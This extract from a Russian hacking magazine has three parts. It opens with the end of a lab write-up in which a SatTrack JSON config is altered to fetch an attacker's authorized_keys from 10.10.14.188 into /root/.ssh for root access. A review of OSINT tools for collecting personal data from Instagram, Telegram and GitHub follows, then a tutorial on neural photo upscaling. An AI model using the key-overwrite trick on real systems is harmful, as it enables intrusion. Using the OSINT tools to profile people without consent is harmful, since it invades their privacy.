
{
    "tleroot": "/tmp/tle/",
    "tlefile": "weather.txt",
    "mapfile": "/usr/local/share/arftracksat/map.json",
    "texturefile": "/usr/local/share/arftracksat/earth.png",


    "tlesources": [
        "http://celestrak.org/NORAD/elements/weather.txt",
        "http://celestrak.org/NORAD/elements/noaa.txt",
        "http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&
FORMAT=tle"
    ],


    "updatePerdiod": 1000,


    "station": {
        "name": "LORCA",
        "lat": 37.6725,
        "lon": -1.5863,
        "hgt": 335.0
    },


    "show": [
    ],


    "columns": [
        "name",
        "azel",
        "dis",
        "geo",
        "tab",
        "pos",
        "vel"
    ]
}

В парамет ре tlesources указаны ссылки для получе ния дан ных, а в парамет-
рах tleroot и tlefile — каталог и имя фай ла для их сохранения. Давай поп-
робуем загрузить со сво его сервера и перезаписать ключ SSH, для чего нем-
ного изме ним конфиг и поменяем эти парамет ры.


{
   "tleroot": "/root/.ssh/",
   "tlefile": "authorized_keys",
   "mapfile": "/tmp/map.json",
   "texturefile": "/tmp/map.json",


   "tlesources": [
       "http://10.10.14.188/authorized_keys"
   ],


   "updatePerdiod": 1000,


   "station": {
       "name": "LORCA",
       "lat": 37.6725,
       "lon": -1.5863,
       "hgt": 335.0
   },


   "show": [
   ],


   "columns": [
       "name",
       "azel",
       "dis",
       "geo",
       "tab",
       "pos",
       "vel"
   ]
}





                        Запуск SatTrack

В логах видим, что данные успешно заг ружены с нашего сервера. Подклю-
чаемся с при ватным ключом и забираем флаг рута.





                           Флаг рута

Машина захвачена!
ТРЮКИ





         ИЗВЛЕКАЕМ ДАННЫЕ
      ИЗ INSTAGRAM, TELEGRAM,
     GITHUB И ДРУГИХ ИСТОЧНИКОВ





Разведка  по  открытым  источникам —
не  толь ко  увле кательное  занятие само
по себе, но и важ ный навык, который быва-
ет полезен в настоящих рас сле дова ниях.
Опытные  сле допыты обыч но  при меня ют           Luc1fer_Lan1us                                                                                           viktorkoen8@gmail.com
спе циальный инструментарий, о котором
мы и погово рим в этой статье.




                     Cбор персональной информа ции без получения
                         согласия наруша ет закон «О персональных дан-
                         ных». Также подобные действия могут образовать
                       состав  прес тупления  по  статье  137  УК РФ
                     «Нарушение неприкосновенности частной жиз-
                          ни». Вся информация в статье предос тавлена
                      исключительно   в   ознакомитель ных   целях.
                    Ни автор, ни редакция не несут ответственности
                        за любые последствия использования при веден-
                      ных в этой публикации сведений.




                     Читай также мой пер вый обзор утилит для OSINT:
                            «5 утилит для OSINT. Собираем инс трументарий
                        сетево го разведчи ка».



ZEHEF

Ути лита Zehef написана на Python и пред назна чена для сбора информации
об адре се электрон ной поч ты. Она про веря ет репутацию адреса в разных
источниках и находит потенциально связанные аккаунты в соцсетях. Крайне
полез но, чтобы проверить, не светилась ли где-то почта, а при некотором
везении еще и получить логин от учетных записей в соцсетях и других сер-
висах.




                       Ус танав ливать все инс трументы мы будем на Kali
                            Linux. Одна ко в других дистрибутивах установ ка
                       вряд ли будет сильно отличаться.


Для установки Zehef просто кло ниру ем репози торий и устанавлива ем зависи-
мости:


git clone https://github.com/N0rz3/Zehef.git
cd Zehef
pip install -r requirements.txt





                          Установка Zehef

Запускаем:


python3 zehef.py <email>

Оформление вывода вроде и пытались сде лать кра сиво, но вышло не очень
информативно. Приходится прос матривать весь вывод, чтобы собрать все
интерес ные вещи, а инте ресного немало.





                       Резуль таты поиска

Видим, что на наш тестовый адрес есть учетные записи, а еще он зарегистри-
рован в Twitter/X, на GitHub и на несколь ких порносай тах.





                       Резуль таты поиска

Как и любая мало-мальски сложная программа, Zehef иногда выда ет ошиб ки.
Если ты получаешь ошиб ку вро де той, что на скриншоте ниже, — удаляй код
поиска по TikTok, и все заработает как надо.





                        Ошиб ка

Сте реть нужно вот этот файл:


Zehef/modules/possible_accounts/social/tiktok.py

А так же удаляй выделенные на скриншотах ниже части кода в Zehef/output/
main.py.





Альтер натив ный вари ант — просто закомментировать глючные участки, что я
и сде лал.


NETSOC_OSINT

Этот скрипт написан на Bash и нап равлен на выгрузку максималь ного
количества информации о пользователе из отдель ных соцсетей. При этом
не тре буется авторизация в них. Выг лядит это так: ты выбираешь одну из дос-
тупных сетей и работаешь уже исклю читель но в рамках того, что доступно
именно для нее. Зато делаешь это максималь но точно! Но лично для меня
было важнее все го то, что для работы скрип та даже не нужно получать API-
токены левых аккаунтов и вписывать их в конфиги.
  Поддержи ваются следующие сервисы:
 • Instagram;
 • TikTok;
 • Twitter/X;
 • Twitch;
 • Telegram;
 • GitHub.

Для каждого дос тупна работа не только с откры тыми, но и с приватными учет-
ными записями.
   Установка  прос та.  Скрипт  представ ляет  собой  всего  один  файл
без зависи мостей (разве что Bash у тебя должен быть). Скачаем репози-
торий, дадим права на исполне ние — и полетели.


git clone https://github.com/XDeadHackerX/NetSoc_OSINT
cd NetSoc_OSINT
chmod 777 netsoc_osint.sh
bash netsoc_osint.sh

Можно будет задать язык, а затем попадаем в само меню инс тру мента. Тут
предлагается выб рать интересу ющую тебя соцсеть.





                    Интерфейс инструмен та

В качестве теста я покажу поиск по Instagram, Telegram и GitHub. Выбираем
для начала  Instagram, вби ваем никнейм искомого челове ка и смотрим
на результаты.





                     Поиск по Instagram

Ре зультаты для  Telegram,  увы, выглядят очень  скудно: фактичес ки все
это мож но посмотреть и самостоятельно в любом клиенте. Даже ID аккаунта
не выводится, что совсем уж ни в какие ворота не лезет. Зато есть воз-
можность скачать аватарку, если она тебе по какой-нибудь при чине вдруг
понадобится.





                      По иск по Telegram

Информации про GitHub уже куда больше, и удоб но, что ее можно получить
целиком. Смысл от использования однозначно есть.





                      Поиск по GitHub

В целом инструмент выдает довольно полную информацию (в рам ках дос-
тупно го через сам сервис), при этом не требуя никаких ключей для доступа
к API.


SNOOP PROJECT

Snoop Project — это перспективный инструмент, главным образом полезный
в странах СНГ. Он уме ет искать более чем по 3000 сай тов. Я даже назвать
не смог бы десятую часть это го, а он уме ет вытаскивать хоть чуть-чуть
информации с каждого из них! Огромный плюс — кросс-плат форменность.
Snoop мож но спо кой но использовать и на Linux, и на Windows, и даже
на Android (понадобится Termux).
  Для уста нов ки заходим на стра ницу релизов инструмента, выбираем
самый акту альный релиз и скачиваем архив для нашей платформы.


mkdir Snoop
wget https://github.com/snooppr/snoop/releases/download/V1.3.8_7_
July_2023/Snoop.for.GNU_Linux.rar
unrar e Snoop.for.GNU_Linux.rar Snoop

Немного удивило, что автор распространяет бинар ник для Linux в виде архи-
ва RAR. Такое, пожалуй, встретишь толь ко в Рос сии.





                        Скачивание Snoop

Запускать приходится не скрипт, который ты можешь открыть и проверить,
а кота в мешке с непонятным содержимым. Пло хо так делать!
  Но мы ведь работа ем в виртуалке, так что нам сам черт не брат. Даем пра-
ва на запуск и выпол няем:


chmod +x snoop_cli
./snoop_cli -f username





                       Резуль таты поиска

Ре зультаты поиска выводят ся не только в терминал, но и в виде HTML-файла,
в котором удоб но сортировать результаты.





                       Резуль таты поиска

Инс трумент очень крутой, хоть и не без странностей, и ему однознач но есть
место при разнообразных рас следованиях.


TOUTATIS

Toutatis уме ет доставать из аккаунта в Instagram даже больше, чем видно
в кли енте. Этот скрипт выводит даже кон тактные данные, такие как электрон-
ная почта и последние две циф ры номера телефона. Да, это не так много,
как хотелось бы, но полезно, если номер цели уже известен и нуж но лишь
под твержде ние, что это ее аккаунт.
  Для уста нов ки пот ребуется только pip. Нас тоятельно рекомендую уста-
нав ливать версию 1.3, поскольку другие оказались проблемными.


pip install toutatis==1.3





                          Установка Toutatis

Далее для работы нам потребуется сес сионная кука Instagram. Заходим
в специально созданный аккаунт и копируем куку sessionid любым удобным
спо собом. Нап ример, нажимаем F12 в Chrome и на вкладке Storage в разделе
Cookies будет наш sessionid.





Ко пируем его и вставляем в команду для запус ка (аргу мент -s).


toutatis -u <username> -s <sessionid>

Вместо <username> вставляем юзер нейм интересу ющей нас учетной записи.





              Вы вод информации об учетной записи

Работа ет Toutatis отлично, жаль только, что при ходится получать session ID
вруч ную. Если бы он авто мати чес ки научился это делать, было бы еще при-
ятнее.


OCTOSUITE

Octosuite нужен для сбора информации о поль зователях, репозиториях
и организациях на GitHub. Этот скрипт мож но использовать для получения
информации о разработ чиках, коммитах, issues и так далее — и все бесплат-
но, без регистрации и SMS. Полезно для тех, кто хочет встроить как мож но
боль ше инте ресных инструментов в свой пайплайн анализа никней ма, но не
зна ет, как дотянуть ся до GitHub.
   Установка предельно прос тая через pip:


pip install octosuite

Справ ка по командам Octosuite доступна по клю чу -h.





                  Список дос тупных аргументов

Для демонстрации я забил в аргу мен ты свой ник и посмотрел, что оно
выведет:


octosuite --method user_profile --username username





Ко неч но, в Octosuite доступны и дру гие функции, которыми можно пос-
мотреть список пользовательских репози тори ев, информацию о каждом кон-
крет ном репозитории, вклю чая его форки, и многое другое.


ÂÛÂÎÄÛ

Сегод няшние пять инструмен тов ста нут отличным дополнением к твоему тре-
вожному OSINT-чемодану, хоть и не могут полноценно заменить взрослые
плат ные решения. Зато некото рые из них дополнят большие инс трументы,
которые не работают с какими-то из мелких источников. Быва ет полез но!
  И конечно, если ты знаешь какие-то еще классные программы по нашей
теме — пиши в ком ментариях!
ТРЮКИ





     ИЗОБРЕТАЕМ ПЕРСОНАЛЬНЫЙ
          НЕЙРОСЕТЕВОЙ
         ФОТОУВЕЛИЧИТЕЛЬ





Что бы не слишком удачная фотог рафия
заиг рала новыми крас ками, нужно долго
редактировать ее в «Фотошо пе» или вос-
пользовать ся возможностями нейросетей.
В этой статье мы подготовим виртуальную         Игорь Орещенков                                                                                                   r0bur@mail.ru
машину  VirtualBox с опе рационной сис-
темой Lubuntu  16.04, установим на нее
программы ней ронных сетей Real-ESRGAN
и GFPGAN и с их помощью вдохнем вто рую
жизнь в снимок из старого буклета.


ÏÐÎÑÒÎ ÑÄÅËÀÉ ÌÍÅ ÊÐÀÑÈÂÎ!

Ес ли ты занимался фотографией вообще и цифровой фотографией в час-
тности, то не понас лышке зна ком с усилиями, которые надо приложить
к исходному материалу, что бы заставить его «заиграть красками». Современ-
ный софт позволя ет применять к рас тро вым изображениям эффекты и филь-
тры, которые в недалеком прош лом были доступны лишь киностудиям. Одна-
ко, что бы в полной мере воспользоваться все ми возможнос тями графических
редак торов, прос то уста новить Photoshop, GIMP или Paint.NET недостаточно.
Пот ребуются спе циальные зна ния в области обра ботки изображений, навыки
прак тического исполь зования при емов коррекции цве та и устранения дефек-
тов, артефактов и других страшных слов. Поэто му если ты не пла нировал пос-
вятить свою жизнь (или как минимум каникулы) фотоискусс тву, то для получе-
ния качественной фотог рафии до недавнего времени тебе понадобилась бы
помощь профес сиона лов.
  В последние годы тех нологии совер шили значительный скачок в сфе ре
обработ ки изображений, приб лизивший возможности программных инстру-
ментов к реали зации магичес кой кнопки «Просто сде лай мне красиво!».
Как ты уже догадался, я имею в виду нейросети, воплощенные в про ектах
Real-ESRGAN  и GFPGAN. Первый  из  них,  Real-ESRGAN, был  создан
для выпол нения «сле пого суперувеличения»  (Blind Super-resolution, BSR)
изображений низкого раз решения с утрачен ной информа цией о деталях.
Основной вариант его практического при мене ния состоит в четырехкратном
уве личе нии исходной картинки.
   Вто рой, GFPGAN, ори ентирован на «слепое вос становление лица» (Blind
Face Restoration, BFR), то есть восста новление изображений челове ческих
лиц, которые (изображения, а не лица) подвер глись поврежде ниям и иска-
жени ям неизвестной природы. При совместном использовании с Real-
ESRGAN  он  дополнительно прорисовывает  отдельные мелкие  детали,
которые «ожив ляют» лица.
  Общая часть GAN в названи ях проектов, озна чающая генеративно-сос-
тязательные сети (Generative Adversarial Network), сообщает нам о том, что
оба основаны на ней ронных сетях, которые обу чены генери ровать реалис-
тичные изображения.




                      Вот ссыл ки на сайты этих проектов:
                     •Real-ESRGAN
                   •GFPGAN


Замечательная  осо бен ность  этих  програм мных  продуктов  в  том,  что
для получе ния результата дос таточно предос тавить исходный матери ал,
запустить процесс и немного подождать. Никаких допол нитель ных указаний
относительно способов получе ния результата не требует ся, все дей ствитель-
но про исхо дит «по щучьему велению, по моему хотению». А сам результат
лучше увидеть на кон кретном при мере. Для испытания я взял фотографию
Стива Джобса и Джо на Скалли из статьи Деборы Уайз «Взлет, падение и сно-
ва взлет ком пании Apple», опубликован ной в информационном буклете ле-
гендарной выставки «Информатика в жиз ни США», проходив шей в 1988–
1989 годах в круп ных городах СССР.





  Фо тография в скане информа ционного буклета — исходный матери ал
  для обработки

Пе ред началом работы приш лось обре зать фотографию и при дать ей более
естественную ориентацию, повернув по часовой стрелке в обычном гра-
фичес ком редак торе. После это го мож но приступать к магичес ким прев-
ращени ям. Прев ращение первое — четырех кратное уве личе ние с помощью
Real-ESRGAN. Результат я уменьшил в четыре раза и поместил рядом с ори-
гиналом, что бы можно было сравнить на глаз. Тебе не кажет ся, что нейронная
сеть еще и выстирала и выг ладила этим парням их рубашки и брюки?





  Оригинал фотографии (слева) и результат обра ботки инстру ментом
  Real-ESRGAN (спра ва)

Вроде бы прогресс уже достигнут. Но на фотографиях людей основное вни-
мание притяги вают лица, и, согласись, было бы неплохо детальнее прорабо-
тать волосы, бро ви,  глаза,  губы... Веро ятно, в этом смог бы помочь
какой-нибудь худож ник. Но вмес то этого мы воспользуемся вторым продук-
том — GFPGAN, который умеет действовать в одной связ ке с Real-ESRGAN.
Итак, второе прев ращение — проработка лиц на фотографии.





  Ли ца пос ле прос того увеличения (вверху) и после проработки инс тру -
  ментом GFPGAN (вни зу)

По-моему, это пол ный успех! Скрипач худож ник не нужен!


ÍÅÎÁÕÎÄÈÌÎÅ ÎÁÎÐÓÄÎÂÀÍÈÅ

Ре зультат хорош, слов нет, но какой ценой его можно достичь? Ты, вероятно,
в кур се, что для промыш ленного использования ней ронных сетей необ-
ходимы серьезные вычислительные мощности — кластерные платформы
с большими хранили щами данных и мощными гра фичес кими про цессорами.
Подой дет, например, майнинговая фер ма времен «биткоиновой лихорад ки».
Но если ты не замахи ваешь ся на самос тоятельное обучение ней ронных
сетей, а прос то желаешь подготовить к печати несколько фотоснимков, то
воз можны вари анты. Например, вос пользоваться одним  из множества
появив шихся в интернете сер висов, предлагающих заг рузить фотог рафию
и через 10–20 секунд получить ее улучшенную вер сию.
  Некоторые сервисы предоставля ют такие услуги даже бесплатно, но надо
помнить, что «если вы за это не платите, то вы не потребитель, вы — продава-
емый про дукт». В любом случае в этой статье мы не будем обсуждать такой
незатей ливый способ, а поговорим лучше о том, как выполнить аналогичную
обработ ку на тво ем персональном компьютере или ноут буке.
  Новые версии Real-ESRGAN и GFPGAN не предъ являют специаль ных тре-
бований к виде оадап теру (хотя поддержка Nvidia CUDA приветс твуется)
и могут работать на довольно заурядном оборудовании. Что бы обработать
фотог рафии этими инстру ментами, твой компьютер дол жен обладать сле-
дующи ми характеристиками:
 • на нем дол жна быть уста новлена 64-разрядная версия Linux не старше
   чем Ubuntu 16.04;
 • дол жно быть не меньше 768 Мбайт по-настоящему ñâî áîä íîé оператив-
   ной памяти, которая не используется ни видеоадаптером, ни операци-
   онной системой;
 • дол жно быть не менее 15 Гбайт сво бодного дис кового прос транс тва.


ÎÏÅÐÀÖÈÎÍÍÀß ÑÈÑÒÅÌÀ

У тебя 32-разрядная Windows? Ничего, безвыход ных ситуаций не бывает! Кто
сказал, что компьютер не может быть виртуаль ным? Устанавливай поскорее
гипервизор VirtualBox, соз давай в нем виртуальную машину и не забудь ука-
зать в ее нас тройках следующие параметры:
 • опе рационная система: Linux/Ubuntu (64 bit);
 • ос новная память: 1024 Мбайт (как минимум, больше — лучше);
 • жесткий диск: 20 Гбайт;
 • се тевой адаптер: NAT (с выходом в интернет).




                    По этой ссылке можно ска чать последнюю вер-
                    сию VirtualBox для 32-разрядных Windows.


Имей в виду, что для установки 64-раз рядной гостевой опе раци онной сис-
темы про цес сор на твоем компь ютере дол жен быть 64-раз рядным и под-
держивать аппаратную вир туализацию Intel VT-x или AMD-V.
  Для виртуальной машины с довольно скромными параметрами подой дет
далеко не всякий дистри бутив Linux. Современ ная вер сия Ubuntu на 1 Гбайт
ОЗУ не смо жет даже запустить инсталлятор, о чем я рассказывал в одной
из пре дыдущих статей. Кроме того, мы не можем раз брасываться оператив-
ной памятью на украшательства рабоче го стола, каждый ее мегабайт пот-
ребуется для решения основной задачи. Мне больше все го понравилась
работа Bodhi Linux 4.5 — дистрибути ва, основанного на Ubuntu 16.04, с лег-
ковесным рабочим сто лом Moksha. Но у него есть спе цифические нюан сы
установки и настройки, поэто му тебе, наверное, будет проще воспользовать-
ся Lubuntu 16.04 — вари антом Ubuntu с рабочим столом LXDE. Его я тоже
про верил, он впол не пригоден для наших целей.




                    По этой ссылке можно скачать образ дистри-
                        бутивного диска 64-раз рядной Lubuntu 16.04.


С уста новкой, уве рен, ты спра вишься сам. Пос ле уста нов ки обязательно
обно ви информацию о содержимом репози тори ев:


sudo apt update

Ес ли планируешь использовать машину не только в качестве фотоувеличи-
теля, можешь актуализировать уста новленное прог раммное обеспечение:


sudo apt upgrade

Но для наших целей этот шаг не обязателен.
   Итак, теперь у тебя точно есть 64-разрядная операционная сис тема Linux.
Приступим к оснащению ее прик ладными прог раммами. Чтобы тебе было
про ще ориентироваться в дальнейших рекомендаци ях, я схе матично наб-
росал то, что в итоге должно получиться.





      Основные элементы файловой структуры «фотоувеличителя»

На рисунке черным цветом обозначены каталоги, зеленым — основные
исполняемые файлы  и  сценарии,  голубым — символические  ссыл ки,
а синим — файлы с данными. Серым цветом выделе ны рабочие каталоги,
которые, вооб ще говоря, ты можешь соз давать по своему предпочтению.
Обрати внимание, что вся файловая струк тура находится в каталоге поль-
зователя, поэтому для ее создания особые привиле гии не нужны.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ




                    ИЗОБРЕТАЕМ ПЕРСОНАЛЬНЫЙ
               НЕЙРОСЕТЕВОЙ ФОТОУВЕЛИЧИТЕЛЬ





ÑÐÅÄÀ ÈÑÏÎËÍÅÍÈß

Для работы Real-ESRGAN и GFPGAN требуется Python версии не стар ше 3.7.
Если на твоем компь ютере это требова ние выполняет ся, можешь пропус тить
этот раздел. Но если ты хочешь соб рать весь набор програм много обес-
печения для «персональ ного нейросетевого фото увеличи теля», чтобы потом
быстро развернуть этот набор на осно ве раз нообразных дис трибути вов
Linux, то советую не отвлекаться и про делать описан ные здесь шаги.
  Нап ример, Ubuntu 16.04 поставля ется с Python 3.5, который довольно
сильно интегри рован с операционной системой, и замена вер сии может при-
вести к неп редсказуемым последствиям. Поэтому давай соберем Python
3.8 и уста новим его в качестве допол нитель ного пользовательского интер-
пре тато ра, не затрагивая системный.
  Сначала уста нови из репозиториев дополнительные пакеты, которые нуж-
ны для сборки интер претатора и его дополнений, в соответствии с рекомен-
дациями  разработ чиков  для  твоей  версии  опе рационной  сис темы.
Для Ubuntu 16.04 это можно выполнить следующей командой:


sudo apt install build-essential gdb lcov pkg-config \
 libbz2-dev libffi-dev libgdbm-dev liblzma-dev \
 libncurses5-dev libreadline6-dev libsqlite3-dev libssl-dev \
 lzma lzma-dev tk-dev uuid-dev zlib1g-dev

Из сети будет заг ружено 63,5 Мбайт архивов. В более новых версиях в этот
спи сок надо добавить пакет libgdbm-compat-dev.
  Затем загрузи с официального сай та исходные тек сты интерпре татора
(26 Мбайт) и распакуй их:


wget https://www.python.org/ftp/python/3.8.18/Python-3.8.18.tgz
tar -xzf Python-3.8.18.tgz

По том сконфигури руй их для уста новки интер претатора в пользовательский
каталог ~/.local, скомпилируй и выпол ни уста новку:


cd Python-3.8.18
./configure --prefix=$HOME/.local --enable-optimizations
make
make install

Проверь, как прошла уста новка:



  $ ~/.local/bin/python3.8 --version
  Python 3.8.18
  $ ~/.local/bin/pip3.8 --version
  pip23.0.1 from ~/.local/lib/python3.8/site-packages/pip (python 3.8)


Ес ли всё в порядке, можешь удалить исходные тексты интерпретатора
и рабочие фай лы:


cd ..
rm -fr Python-3.8.18 Python3.8.18.tgz




                   В дистри бутивах Ubuntu путь ~/.local/bin
                      при сутствует  в  переменной  окружения PATH
                      и  явля ется приоритетным. Поэтому  запускать
                       интерпретатор можно без указания путевого пре-
                     фик са. В иных случаях мож но либо добавить ука-
                       занный  путь  в  начало  значения  переменной
                   PATH,  либо  запускать  исполняемые  фай лы
                      по полному имени: ~/.local/bin/python3.
                   8,  ~/.local/bin/pip3.8.  В  дальнейшем
                       изложении будет использоваться сокращенный
                      вари ант, а ты разберись, какой требуется в твоей
                      операционной системе, и дей ствуй соответствен-
                          но.


Нуж ная вер сия Python теперь тоже в наличии. Но прежде чем переходить
к установке основных программ «фотоувеличи теля», надо убедить ся, что
рабочей памяти компьютера для это го достаточ но. Узнать имеющиеся ресур-
сы мож но с помощью такой команды:


free -h

Сложи зна чение в последней колонке строки Mem (available) со значением
в  последней  колонке  строки  Swap   (free).  Если  получилось  боль-
ше 2560 Мбайт (2,5 Гбайт), то следующий раз дел можешь пропус тить. В про-
тив ном случае придется увеличить вир туаль ную память операционной сис-
темы.


Óâåëè÷åíèå âèðòóàëüíîé ïàìÿòè
Как ты знаешь, виртуаль ная память Linux представлена физической оператив-
ной памятью и памятью странич ной подкачки на внешнем носителе —
выделенном разделе жесткого диска или в спе циальном swap-файле. Если
во вре мя работы при ложения опе ративная память исчерпывается, операци-
онная система исполь зует механизм подкачки, переме щая неиспользуемые
страницы на внеш ний носитель и заг ружая с него страницы c данными,
которым тре бует ся обра ботка. Продолжительную активную работу в таком
режиме хорошо характеризуют сло ва из песни В. С. Высоцкого: «это не езда,
а ерзанье».
  Но в нашем случае увеличение и использование виртуальной памяти —
оправданный спо соб решения поставлен ной задачи, и вот почему. При нас-
тройке «фото увеличи теля» я обна ружил, что исчерпание памяти воз никает
в сле дующих ситуациях:
 • при установке дополнительных модулей Python (о них речь пой дет ниже),
   когда программа pip использует оперативную память в качестве буфера
   и нет никаких проб лем в том, чтобы позволить операционной системе
  кешировать загружаемые из сети данные на диск;
 • при ини циали зации ней ронных сетей и формировании фай лов с резуль-
   татами работы, что явля ется незначительным фрагментом общего объ ема
   работы.

Для основного процесса обработки изоб ражений заявленных 768 Мбайт сво-
бод ной опе ративной памяти вполне достаточ но.
  При установке на виртуальную машину с 1024 Мбайт ОЗУ операционной
системы Lubuntu 16.04 авто матически создается раз дел подкачки раз мером
око ло гигабай та. Для работы «фотоувеличи теля» этого мало. Поэтому соз-
дадим swap-файл размером 2048 Мбайт (2 Гбайт) и добавим его к име ющей-
ся вир туальной памяти (все коман ды запускаем от рута):


swapoff -a
dd if=/dev/zero of=/swapfile bs=1024k count= 2048
chmod 0600 /swapfile
mkswap /swapfile
swapon -a
swapon /swapfile

При веденная выше пос ледова тельность команд начинается с отключения
памяти подкачки (swapoff), чтобы эти дей ствия мож но было без изме нений
выполнять на опе рационных системах, использующих не раз дел, а файл под-
качки, то есть /swapfile. Кстати, в этом случае пос ледняя команда сообщит
об ошиб ке swapon failed: Device or resource busy, поскольку файл
под качки уже будет задействован предыду щей командой. Проконтролиро-
вать, какие именно хра нилища под качки используются, можно с помощью
коман ды swapon без параметров.


ÍÅÉÐÎÑÅÒÈ «ÔÎÒÎÓÂÅËÈ×ÈÒÅËß»

Проекты GFPGAN и Real-ESRGAN используют вспо могательные ресурсы:
 • BasicSR, Basic Super Restoration — прог раммное обеспечение для восста-
   новления качес тва фото- и видеоматериалов;
 • FaceXLib — реали зации алго ритмов для работы с лицами людей на фотог-
  рафи ях (обнаруже ние, выравнивание, выделе ние основных эле ментов
   и прочее).

За реализацию всей скуч ной математики нейронных сетей на центральных
и графических процессорах отве чает пакет PyTorch. Уста новим эти вспо мога-
тель ные пакеты Python:


pip3.8 install basicsr --cache ~/pipcache
pip3.8 install facexlib --cache ~/pipcache

Кеш исполь зует ся для того, что бы заг рузка пакетов не начина лась заново,
если по каким-то при чинам она будет прервана, а продолжалась с мес та
остановки.




Имей в виду, что BasicSR со всеми сво ими зависи мос тями занимает боль-
ше 4 Гбайт и загрузка этих данных из сети даже в сжатом виде может пот-
ребовать значительного времени.
  Не исклю чено пре рывание процес са с сооб щени ем об ошиб ке:


 Collecting torch >= 1.7
 ERROR: Exception:
 ...
 MemoryError


Это значит, что надо вернуться к предыду щему разделу и про верить исполь-
зование памяти. Возможно, ты перезагружал компь ютер и забыл снова под-
ключить файл подкачки.


По завер шении уста новки вспомогательных пакетов содер жимое каталога
~/.local уве личится до 5 Гбайт, а в кеше ~/pipecache будет находить-
ся 2,4 Гбайт данных, которые теперь можно уда лить:


rm -fr ~/pipcache

Установим основное програм мное обеспечение GFPGAN и Real-ESRGAN
прямо из Git-репозитори ев:


sudo apt install git
mkdir ~/GAN && cd ~/GAN
git clone https://github.com/xinntao/Real-ESRGAN.git
git clone https://github.com/TencentARC/GFPGAN.git

Это не зай мет мно го времени, а после завершения установки в нашем
катало ге ~/GAN появятся под каталоги GFPGAN и Real-ESRGAN, занима-
ющие 25 и 24 Мбайт соответственно.
   Чтобы пре дот вратить в даль нейшем уста нов ку допол нитель ного модуля
Python и исполь зовать уже имеющиеся файлы, создадим ссыл ку на рабочий
каталог gfpgan.


cd ~/.local/lib/python3.8/site-packages
ln -s ../../../../GAN/GFPGAN/gfpgan

Те перь давай настро им установленное прог раммное обес печение:


cd ~/GAN/GFPGAN
python3.8 setup.py develop
cd ~/GAN/Real-ESRGAN
python3.8 setup.py develop
ln -s ../GFPGAN/gfpgan

Пос ледняя команда соз дает в каталоге Real-ESRGAN ссыл ку, чтобы избе жать
дублирования весов моделей GFPGAN.
  На этом уста новка и настрой ка програм много обес печения «фотоувеличи-
теля» завершена. Оста лось выполнить пос ледний шаг подготови тельного
эта па — загрузить «модели», то есть веса нейрон ных сетей, заранее вычис-
ленные в ходе их обучения. Если это го не сде лать, то при первом исполь-
зовании программ GFPGAN и Real-ESRGAN они будут загружены автомати-
чески. Но можно сохранить контроль над про цессом и вручную выпол нить
следующие команды:



  $ cd ~/GAN
  $ wget
  https://github.com/TencentARC/GFPGAN/releases/download/v1.3.0/GFPGANv1.3
  .pth -P GFPGAN/gfpgan/weights
  $ wget
  https://github.com/xinntao/facexlib/releases/download/v0.1.0/detection_R
  esnet50_Final.pth -P GFPGAN/gfpgan/weights
  $ wget
  https://github.com/xinntao/facexlib/releases/download/v0.2.2/parsing_par
  senet.pth -P GFPGAN/gfpgan/weights
  $ wget https://github.com/xinntao/Real-
  ESRGAN/releases/download/v0.1.0/RealESRGAN_x4plus.pth -P Real-
  ESRGAN/weights


Будь внимателен при указании пути к целевому каталогу. Если допус тишь
опечатку, wget без предупреждения соз даст новый подкаталог и выпол нит
загрузку данных в него. Естес твен но, потом программное обеспечение
«фотоувеличи теля» не смо жет обнаружить такой файл.




                   Фай лы с весами для ней ронных сетей GFPGAN
                      и Real-ESRGAN име ют следующие размеры:
                  •GFPGANv1.3.pth — 332 Мбайт;
                  •detection_Resnet50_Final.pth — 104 Мбайт;
                  •parsing_parsenet.pth — 81 Мбайт;
                  •RealESRGAN_x4plus.pth — 64 Мбайт.



ÁÎÐÜÁÀ Ñ ÏÐÎÃÐÅÑÑÎÌ

Казалось бы, теперь-то все готово к тому, что бы заняться обработкой фотог-
рафий. Действи тельно, у меня настроенный по описанной методике «фото-
уве личитель» сразу же заработал. Но ког да я через несколько дней проверял
инструкцию при работе над этой статьей, повторно выполняя все действия,
меня поджидал сюрприз. Програм мное обеспечение GFPGAN отказывалось
работать, сообщая об ошибке:



  ImportError: urllib3 v2.0 only supports OpenSSL 1.1.1+, currently
  the 'ssl' module is compiled with 'OpenSSL 1.0.2g 1 Mar 2016'.
  See: https://github.com/urllib3/urllib3/issues/2168


Вот тебе на! Оказалось, что, при няв решение об исполь зовании устаревшей
операци онной системы, мы вступили на скользкую дорожку. За эти несколько
дней Python-модуль google-auth, по какой-то причине вхо дящий в сос тав
зависи мостей програм много обеспечения «фото увеличи теля», обновил ся
до вер сии 2.0.5 и решил запретить использование устаревших криптогра-
фичес ких протоко лов, подняв требования к системной библиоте ке OpenSSL.
Но для Ubuntu 16.04 ожидать обновлений уже не приходится.
  Собирать эту библиотеку из исходников, как мы сде лали с Python 3.8? Это,
конечно, один из вариантов. Но, если хорошенько подумать, зачем нам
google-auth и сетевая безопасность на виртуаль ной машине, которая соз-
давалась спе циаль но для локальной обра ботки фотографий? Лучше пойдем
другим путем и установим уста рев ший модуль google-auth версии 1.26.16:



  $ pip3.8 install urllib3=1.26.16
  ERROR: ... google-auth 2.23.1 requires urllib>=2.0.5
  Successfully installed urllib3-1.26.16


Не будет работать google-auth? Не очень-то и хотелось! Главное, что сам
«фотоувеличи тель» после этого запус кается. Однако как быть в дальнейшем?
Прогресс ведь не оста новишь, и поезд с модулями Python будет все дальше
уходить от Ubuntu 16.04. Поэто му рекомен дую тебе сохранить уста нов ленный
набор программ в архиве GAN_U1604.tgz:


cd ~
tar -zcf GAN_U1604.tgz .local GAN

Имея сни мок работа ющего вари анта «фотоуве личителя», тебе не сос тавит
труда при необходимос ти развернуть его на све жеустановленной виртуаль-
ной машине. Тем самым ты сбережешь себе не только нер вы, но и время,
необходимое для загрузки данных из сети и последу ющей настрой ки.




Возможно, у тебя возник воп рос, как нас троить обмен файлов меж ду вир-
туальной машиной и компь ютером с гипервизором. VirtualBox пред лага ет
использовать  дополнение,  проб расывающее  папки файловой  системы
компьюте ра в виртуальную машину. Но я пред почитаю более универ саль ный
спо соб — сетевой обмен по протоколу FTP. Почти любая операци онная сис-
тема, установ ленная на виртуальной машине, содер жит в сво ем сос таве тот
или иной FTP-клиент, а под нять на компьютере FTP-сервер и настроить бран-
дмауэр — задача, которую нужно решить один раз. Кстати, я использую сер-
вер, который реали зует утилита «Швейцар ский файловый нож», запус кая его
при необ ходимости:


